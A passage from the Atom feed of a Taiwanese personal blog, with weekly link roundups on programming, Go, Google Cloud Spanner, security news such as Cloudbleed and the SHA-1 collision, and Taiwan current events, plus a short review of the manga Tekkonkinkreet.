&lt;li&gt;&lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1139"&gt;1139 - cloudflare: Cloudflare Reverse Proxies are Dumping Uninitialized Memory - project-zero - Monorail&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;(It took every ounce of strength not to call this issue "cloudbleed")  Corpus distillation is a procedure we use to optimize the fuzzing we do by analyzing publicly available datasets. We've spoken a bit about this publicly in the past, for example:  https://security.googleblog.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CloudFlare 官方詳細說明  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.cloudflare.com/incident-report-on-memory-leak-caused-by-cloudflare-parser-bug/"&gt;Incident report on memory leak caused by Cloudflare parser bug&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Last Friday, Tavis Ormandy from Google’s Project Zero contacted Cloudflare to report a security problem with our edge servers. He was seeing corrupted web pages being returned by some HTTP requests run through Cloudflare.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有人稍微整理了一下該如何處理這件事  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@octal/cloudbleed-how-to-deal-with-it-150e907fd165"&gt;Cloudbleed: How to deal with it – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有人列出了使用 CloudFlare 服務的網站名單（不一定但有可能受影響）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/pirate/sites-using-cloudflare"&gt;GitHub - pirate/sites-using-cloudflare: List of domains using Cloudflare DNS (potentially affected by the CloudBleed HTTPS traffic leak)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;檢測網站是不是有使用 CloudFlare  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.doesitusecloudflare.com"&gt;http://www.doesitusecloudflare.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google 系列  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html"&gt;Google Online Security Blog: Announcing the first SHA1 collision&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Cryptographic hash functions like SHA-1 are a cryptographer’s swiss army knife. You’ll find that hashes play a role in browser security, managing code repositories, or even just detecting duplicate files in storage. Hash functions compress large amounts of data into a small message digest.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;已經確定找到 SHA-1 碰撞的演算法了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloudplatform.googleblog.com/2017/01/7-ways-we-harden-our-KVM-hypervisor-at-Google-Cloud-security-in-plaintext.html"&gt;Google Cloud Platform Blog: 7 ways we harden our KVM hypervisor at Google Cloud: security in plaintext&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/keybase/client"&gt;GitHub - keybase/client: Keybase Go Library, Client, Service, OS X, iOS, Android, Electron&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;keybase.io 似乎把 PGP key 傳遞這件事做到簡單易用了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gitleaks.com/"&gt;GitLeaks - Search Engine for exposed secrets on the web&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個好歡樂啊  &lt;/li&gt;
&lt;li&gt;不過目前好像只有蒐集 GitHub 上的  &lt;/li&gt;
&lt;li&gt;之後預計加入其他來源  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/FallibleInc/security-guide-for-developers"&gt;GitHub - FallibleInc/security-guide-for-developers: Security Guide for Developers (实用性开发人员安全须知)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;A practical security guide for web developers (Work in progress) The intended audience Security issues happen for two reasons - Developers who have just started and cannot really tell a difference between using MD5 or bcrypt. Developers who know stuff but forget/ignore them.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/hungtraan/FacebookBot"&gt;GitHub - hungtraan/FacebookBot: A Facebook Messenger Bot that supports Voice Recognition, Natural Language Processing and features such as: search nearby restaurants, search trending news, transcribe and save memos to the cloud.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Optimist Prime is a Facebook Messenger Bot that supports Voice Recognition, Natural Language Processing and features such as: search nearby restaurants, search trending news, transcribe and save memos to the cloud.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;看起來就是把各種平台的 API 串起來，IBM 的 Waston 等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://taobaofed.org/blog/2017/02/16/a-guide-to-api-design/index.html"&gt;從達標到卓越 —— API 設計之道 | Taobao FED | 淘寶前端團隊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;新技术层出不穷，长江后浪推前浪，而浪潮褪去后能留下来的，是一些经典的设计思想。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/TaiwanPassportSticker/photos/a.1465798763729893.1073741828.1465796757063427/1635278683448566/?type=3&amp;amp;theater"&gt;【實驗：Republic of中國不喜歡台灣貼紙 那麼貼中國共產黨黨徽貼紙呢？】... - 台灣國護照貼紙 Taiwan Passport Sticker | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中華民國的護照貼台灣國貼紙過海關會被欄，但是貼共產黨黨徽完全沒事唷。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Gossiping/M.1487699803.A.053.html"&gt;[問卦] 還記得中國用語入侵前的用詞嗎&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;文化入侵 QQ  &lt;/li&gt;
&lt;li&gt;媒體都一堆中資了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://shaohui.simpleinfo.cc/more/"&gt;全能古蹟燒燬王 - 你知道嗎？在台灣，平均每個月都會有歷史建物「離奇失火」&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/photo.php?fbid=10211125434633061&amp;amp;set=a.1237143290030.37008.1272688531&amp;amp;type=3&amp;amp;theater"&gt;Yen Jing Bo - 「台灣不用急著手機支付，應該先把信用卡支付做好」 今天早上又看到一篇講中國手機支付好棒棒的文...&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.thinkingtaiwan.com/content/6057"&gt;【人心人術】在二二八中消逝的台灣第一位留美博士：林茂生 | 想想論壇&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;台灣第一位留美哲學博士林茂生，一生都為台灣的教育和文化努力；原本終於盼望到「台灣光復」的這一刻，卻沒想到，不久之後，他成了消失在島嶼上的台灣菁英之一......  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jobs.ho600.com"&gt;到 何六百工作(遠端徵1~2人)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這間公司的徵才文案寫的挺用心也挺狂的就是  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=3vxmvTXz6EM"&gt;商戰與談判 - ER講堂第０課 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這影片真精彩  &lt;/li&gt;
&lt;li&gt;上半場拿 World Gym vs 統一集團 和 書亞集成 vs 台智卡 的案例，講商場上小蝦米要怎麼搏大鯨魚。  &lt;/li&gt;
&lt;li&gt;下半場拿 Paganini+ 和 和沛科技 的案例，講成功經營個人品牌的大神們背後不為人知的一面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="data science"></category><category term="devops"></category><category term="gcp"></category><category term="golang"></category><category term="kswapd"></category><category term="misc"></category><category term="movie"></category><category term="news"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category><category term="web"></category></entry><entry><title>Y2017W07</title><link href="https://blog.m157q.tw/posts/2017/02/20/y2017w07/" rel="alternate"></link><published>2017-03-13T12:09:00+08:00</published><updated>2017-03-13T12:09:00+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-02-20:posts/2017/02/20/y2017w07/</id><summary type="html">&lt;h3&gt;algorithm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ro31337/bigoposter"&gt;bigoposter/bigoposter.pdf at master · ro31337/bigoposter&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個整理了一些常用演算法的時間複雜度與空間複雜度的海報，挺適合印下來貼在牆壁上的。  &lt;/li&gt;
&lt;li&gt;其他相關的 repo:  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/josem/bigoref"&gt;https://github.com/josem/bigoref&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bigoref.com/"&gt;http://bigoref.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ericdrowell/BigOCheatSheet"&gt;https://github.com/ericdrowell/BigOCheatSheet&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://bigocheatsheet.com/"&gt;http://bigocheatsheet.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://serverfault.com/questions/62411/how-can-i-sort-du-h-output-by-size"&gt;linux - How can I sort du -h output by size - Server Fault&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;du -hs * | sort -h&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;原來 &lt;code&gt;sort&lt;/code&gt; 有 &lt;code&gt;-h&lt;/code&gt; 的選項可以用呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2017/01/business-benefits-of-go/"&gt;從商業利益看 Go 程式語言 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;今年是不是該來學一下 Golang 了啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.goin5minutes.com/screencasts/"&gt;Go In 5 Minutes - Short, helpful screencasts for professional Go developers&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://golang.org/doc/go1.8"&gt;Go 1.8 Release Notes - The Go Programming Language&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The latest Go release, version 1.8, arrives six months after Go 1.7. Most of its changes are in the implementation of the toolchain, runtime, and libraries. There are two minor changes to the language specification. As always, the release maintains the Go 1 promise of compatibility.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.golang.org/go1.8"&gt;Go 1.8 is released - The Go Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Today the Go team is happy to announce the release of Go 1.8. You can get it from the download page. There are significant performance improvements and changes across the standard library.  The compiler back end introduced in Go 1.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;google&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/spanner/"&gt;Cloud Spanner | Automatic Sharding with Transactional Consistency at Scale  |  Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Cloud Spanner is the first and only relational database service that is both strongly consistent and horizontally scalable.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/02/16/google-launches-cloud-spanner-a-new-globally-distributed-database-service"&gt;兼備關聯式與 NoSQL 兩者優點，Google 推出「私藏技術」Cloud Spanner！ – INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Google 昨天 宣布推出雲端資料庫「Cloud Spanner」Beta 版！傳統以來，工程師或資料管理人員得從傳統關聯式資料庫及 NoSQL 資料庫二擇一，傳統關聯式具較好穩定性與交易一致性但擴充困難，而 NoSQL 容易進行水平擴充。不同於 Bigtabl  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://community.qingcloud.com/topic/88/google%E5%85%A8%E7%90%83%E7%BA%A7%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93spanner%E5%8E%9F%E7%90%86"&gt;Google全球級分佈式數據庫Spanner原理 | 青雲QingCloud 社區&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;挺詳細的 Cloud Spanner 原理講解  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1487082859.A.4CA.html"&gt;Fw: [心得] 想要超過年資薪資的web前端面試心得 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯  還是找真外商吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@fchern/%E9%9D%A2%E8%A9%A6%E6%8A%80%E5%B7%A7-4be66bcf71f7"&gt;面試技巧 – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯 大公司跟小公司要的人真的是有本質上的不同，照理說應該也沒有所謂的優與劣，感覺是個性使然，不過大家普遍還是喜歡聽到大公司的頭銜就是（？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;libretaxi&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@romanpushkin/how-i-made-uber-like-app-in-no-time-with-javascript-and-secret-sauce-94ef9120c7f6"&gt;Uber-like app in no time with JavaScript and secret sauce – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近 Uber 的名聲真的是愈來愈差，有人乾脆直接用 Telegram 做出了一個可以讓乘客和司機直接聯絡的 bot。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.theregister.co.uk/2017/02/15/think_different_shut_up_and_work_harder_says_linus_torvalds/"&gt;Talk of tech innovation is bullsh*t. Shut up and get the work done – says Linus Torvalds • The Register&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;OSLS Linus Torvalds believes the technology industry's celebration of innovation is smug, self-congratulatory, and self-serving.  The term of art he used was more blunt: "The innovation the industry talks about so much is bullshit," he said. "Anybody can innovate.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;"Talk is cheap. Show me the code."  &lt;/li&gt;
&lt;li&gt;「做不出來叫嘴炮，做得出來才叫創新。」應該就是這個意思  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/lnishan/awesome-competitive-programming"&gt;GitHub - lnishan/awesome-competitive-programming: A curated list of awesome Competitive Programming, Algorithm and Data Structure resources&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個整理了關於程式競賽相關的清單，因為 repo owner 是台灣人，所以也收錄了不少台灣相關的資源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jam-py/jam-py"&gt;GitHub - jam-py/jam-py: Jam.py “all in the browser” framework is the fastest way to create a web database application&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Jam.py is an event-driven framework for developing web database applications. The Server side uses Python and werkzeug library, the client side - JavaScript, JQuery and Bootstrap.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;好像有點厲害，直接用 GUI 選一選就可以建出用到資料庫的應用程式。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;movie&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.techug.com/post/10-documentary-films-about-programmer.html"&gt;十部經典「程序員」紀錄片，你看過幾部？ | 程序師&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有空好像該來看看  &lt;/li&gt;
&lt;li&gt;想起以前在 bs2 個版好像也有整理一個跟 coding 相關電影的清單，有空再找找看好了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%8B%84%E5%A5%8E%E5%87%A1%E6%B0%8F%E7%97%87"&gt;狄奎凡氏症 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;狄奎凡氏症（De Quervain Disease），正式醫學名稱為「狹窄性腱鞘炎」，俗稱「媽媽手」，因瑞士外科醫生狄奎凡於1895年詳談此症而得名。  &lt;/li&gt;
&lt;li&gt;原來媽媽手的全名是這麼寫的...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%B8%B8%E6%9F%93%E8%89%B2%E4%BD%93%E6%98%BE%E6%80%A7%E5%A4%9A%E5%9B%8A%E8%82%BE"&gt;常染色體顯性多囊腎 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;ADPKD  &lt;/li&gt;
&lt;li&gt;多囊腎... 有密集恐懼症的人可能不要點開比較好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=MQEz1j8Ye_Y&amp;amp;list=PLQc1XfyoC1K4YEGDXLwtXOmUSzjZIEQuf&amp;amp;index=1"&gt;【央視一分鐘】工時計算新制上路 撈撈混混真淘氣 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「能撈就撈，能混就混，大家來拖垮這個政府，好不好啊？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;以自己公務員的身份講這種話都不覺得有問題的嗎 呵呵  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.twreporter.org/a/photo-railyway-worker"&gt;曾原信／台鐵「夜巡者」：星光下守護鐵軌的人 - 報導者 The Reporter&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;晚間末班車載送最後一批乘客，火車的亮光逐漸離遠，而工務車上的台鐵工人，才剛點亮頭燈，準備上工。   為了不再發生因「火線」上仍有列車行駛，造成工人不察被撞死的意外，台鐵多數的工程項目從白天  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/joke/M.1487330703.A.034.html"&gt;約嗎？ - 看板 joke - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這真的不是 Trivago 的業配文嗎 XD  &lt;/li&gt;
&lt;li&gt;原來這句廣告台詞有各國語言的版本  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;north korea&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.storm.mg/article/223732"&gt;BBC特寫：金正男講述「金家王朝」罕見內幕-北韓｜金正恩｜金正日｜平壤｜暗殺｜金正男｜北韓政治-風傳媒-BBC中文網, 童倩 BBC中文網日本特約記者&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2011年12月去世的北韓最高領導人金正日的長子金正男與《東京新聞》編輯委員五味洋治互通的150封電子郵件以及兩人在澳門、北京先後共約7小時的談話內容，經五味整理後出的書《父親金正日與我 金正男獨家告白》  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.bbc.com/zhongwen/trad/world-38978504"&gt;金正男身亡：是什麼導致了他的死亡? - BBC 中文網&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;金正男是朝鮮第二代領導人金正日之子，也是朝鮮現任領導人金正恩同父異母的兄長。  金正男在1971年5月於平壤出生，母親是演員成蕙琳。金正男的外祖父母是來自韓國、信奉共產主義的知識分子，在韓戰時期移居至朝鮮。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%87%91%E6%AD%A3%E7%94%B7"&gt;金正男 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;car&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blacktyre.pixnet.net/blog/post/35119998-%E6%96%9C%E4%BA%A4%E8%83%8E-v.s.-%E8%BC%BB%E5%B0%84%E5%B1%A4%E8%BC%AA%E8%83%8E"&gt;斜交胎 V.S. 輻射層輪胎 @ 黑輪學府 :: 痞客邦 PIXNET ::&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;斜交輪胎(BIAS)是由多層簾子布以小於90度交叉放置貼合組成的輪胎,它的簾布是由縱向強韌的經線與放在各經線之間的少數緯線織成. 胎體簾布層材質有棉簾線. 人造絲簾線. 尼龍簾線. 聚酯簾線和金屬絲 簾線等.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://peace543.pixnet.net/blog/post/30965015-5%E5%88%86%E9%90%98%E6%95%99%E4%BD%A0%E7%9C%8B%E8%BC%AA%E8%83%8E%E8%A6%8F%E6%A0%BC%E3%80%81%E8%BC%AA%E8%83%8E%E5%87%BA%E5%BB%A0(%E7%94%9F%E7%94%A2-%E8%A3%BD%E9%80%A0)"&gt;5分鐘教你看輪胎規格、輪胎出廠(生產/製造)日期 @ 毒舌痞子的五四三日記 :: 痞客邦 PIXNET ::&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看車的型錄感覺比看電腦的還複雜，一堆東西真的都看不懂，光是輪胎的型號啥的就藏了這麼多的東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="algorithm"></category><category term="car"></category><category term="cli"></category><category term="golang"></category><category term="google"></category><category term="interview"></category><category term="libretaxi"></category><category term="movie"></category><category term="news"></category><category term="north korea"></category><category term="programming"></category><category term="ptt"></category><category term="taiwan"></category><category term="trivia"></category><category term="web"></category></entry><entry><title>《惡童當街》</title><link href="https://blog.m157q.tw/posts/2017/02/19/tekkonkinkreet/" rel="alternate"></link><published>2017-02-19T23:28:40+08:00</published><updated>2017-02-19T23:28:40+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-02-19:posts/2017/02/19/tekkonkinkreet/</id><summary type="html">&lt;p&gt;&lt;img alt="cover 0" src="/files/tekkonkinkreet/cover-0.jpg" /&gt;&lt;br /&gt;
&lt;img alt="cover 1" src="/files/tekkonkinkreet/cover-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="cover 2" src="/files/tekkonkinkreet/cover-2.jpg" /&gt;&lt;br /&gt;
&lt;img alt="cover 3" src="/files/tekkonkinkreet/cover-3.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;2017/02/13 (一），&lt;br /&gt;
下班後和同事去逛了 2017 台北國際書展(TiBE)最後一天，&lt;br /&gt;
起因是他前一天有逛了一下，&lt;br /&gt;
今天想去買書。&lt;br /&gt;
想說沒去過，&lt;br /&gt;
就跟去看看。  &lt;/p&gt;
&lt;p&gt;晚上星光票一人只要 50 元，&lt;br /&gt;
挺便宜的，&lt;br /&gt;
人潮也沒有電玩展那麼擁擠，&lt;br /&gt;
個人覺得挺舒服的。  &lt;/p&gt;
&lt;p&gt;然後這部短篇漫畫作品就是他當天買的書，&lt;br /&gt;
看完之後他覺得挺棒的，&lt;br /&gt;
所以跟他借來看看。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;這部漫畫的連載期間為 1993 ~ 1994 年， 距今大約 23 年了。&lt;br /&gt;
我看的是今年 2/10 發行的新版，所以書的封面都挺鮮艷的。&lt;br /&gt;
全部只有 33 話， 是一部閱讀起來沒啥負擔的漫畫。&lt;br /&gt;
而且我覺得漫畫本身就給人一種電影鏡頭的感覺，讓讀者滿容易腦補其中漏掉的畫面的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;真的是一部很棒的短篇漫畫作品呢  &lt;/p&gt;
&lt;p&gt;人性沒有絕對的黑與白&lt;br /&gt;
社會沒有絕對的善與惡&lt;br /&gt;
現實因此而醜陋&lt;br /&gt;
卻也因此而美麗  &lt;/p&gt;
&lt;p&gt;這部漫畫在 2006 年有推出電影版&lt;br /&gt;
有空再來看看吧  &lt;/p&gt;
&lt;p&gt;很喜歡作者松本大洋在後記中的一段話：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;比起白色對黑色說「你好髒」、黑色對白色說「你好空洞」的世界，&lt;br /&gt;
白色認為黑色「很帥」、黑色認為白色「好美」的世界更棒。&lt;br /&gt;
要是能迎來後面這樣的世界該有多美妙。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="postface" src="/files/tekkonkinkreet/postface.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%83%A1%E7%AB%A5"&gt;惡童 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.books.com.tw/products/0010741698"&gt;博客來-惡童當街全三冊套書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Comics"></category><category term="Tekkonkinkreet"></category></entry><entry><title>Y2017W06</title><link href="https://blog.m157q.tw/posts/2017/02/13/y2017w06/" rel="alternate"></link><published>2017-02-13T01:40:56+08:00</published><updated>2017-02-13T01:40:56+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-02-13:posts/2017/02/13/y2017w06/</id><summary type="html">&lt;h3&gt;app&lt;/h3&gt;
&lt;ul&gt;
